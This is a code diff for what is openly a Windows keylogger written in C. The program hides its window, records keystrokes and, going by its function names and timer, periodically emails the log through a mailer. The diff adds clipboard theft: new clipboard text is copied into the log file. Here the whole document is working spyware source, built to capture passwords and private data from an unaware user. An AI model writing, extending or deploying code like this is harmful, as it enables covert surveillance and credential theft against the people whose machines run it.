@@ -7,6 +7,7 @@
 
 // GLOBALS //
 #define BUF_SIZE 256   // general purpose for buffers
+#define CLIP_SIZE 5000 // 5000 characters to be copied and logged
 #define LOG_TIMER 1800 // time limit until send email (3600s == 1 hour)
 
 // FUNCTION DECLARATIONS //
@@ -17,7 +18,7 @@ void HideWindow();
 void InitLogfile(char* logfile_path);
 int GetLogfileLength(char* logfile_path);
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
-void GetCurrentClipboard();
+void UpdateClipboard(char* logfile_path, char* prev_clipboard);
 void ExecuteMailer(char* mailer_path, char* directory);
 void KeystrokeHandler(short key, FILE* logfile);
 
@@ -45,10 +46,16 @@ int main(){
     HWND foreground = GetForegroundWindow();
     GetWindowText(foreground, window, BUF_SIZE);
 
+    // initialize the clipboard
+    char clipboard[CLIP_SIZE];
+
     // active program process
     while(1){
 
         Sleep(10); // reduce CPU usage
+
+        // check for new copied content
+        UpdateClipboard(logfile_path, clipboard);
         
         // loop thru keyboard characters
         for(short key = 8; key <= 222; key++){
@@ -274,19 +281,26 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
 }
 
 // get the current contents of the clipboard
-void GetCurrentClipboard(){
+void UpdateClipboard(char* logfile_path, char* prev_clipboard){
     if(OpenClipboard(NULL)){
         if(IsClipboardFormatAvailable(CF_BITMAP)){
             // notify that a picture is currently copied
+            CloseClipboard();
         }
         else if(IsClipboardFormatAvailable(CF_TEXT)){
             HWND clipboard = GetClipboardData(CF_TEXT);
-            // compare to previous clipboard
-            // update logfile iff new content
-            // set current clipboard to previous
+            CloseClipboard();
+
+            // compare to previous clipboard and update logfile iff new content
+            if(strcmp(prev_clipboard, (char*)clipboard) != 0){
+                strncpy(prev_clipboard, (char*)clipboard, CLIP_SIZE);
+                FILE* logfile = fopen(logfile_path, "a");
+                fprintf(logfile, "\nCLIPBOARD: %s\n --- END CLIPBOARD ---\n", prev_clipboard);
+                fflush(logfile);
+                fclose(logfile);
+            }
         }
         // TODO add UNICODE conditional
-        CloseClipboard();
     }
 }
 
